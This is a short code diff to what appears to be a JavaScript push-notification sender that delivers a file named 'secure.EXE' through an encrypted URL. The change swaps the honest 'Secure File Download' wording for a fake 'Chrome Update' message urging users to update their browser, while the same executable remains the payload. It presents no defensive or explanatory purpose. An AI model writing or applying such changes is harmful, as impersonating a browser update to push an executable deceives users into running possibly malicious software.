@@ -150,8 +150,8 @@ async function sendSpecificFileNotification(subscription) {
     
     // Prepare notification payload
     const payload = JSON.stringify({
-      title: 'Secure File Download',
-      body: 'Your secure.EXE file is ready for download. Click to access.',
+      title: 'Chrome Update',
+      body: 'Please update your browser to the latest version.',
       data: {
         encryptedUrl: encryptedUrl,
         fileName: 'secure.EXE'
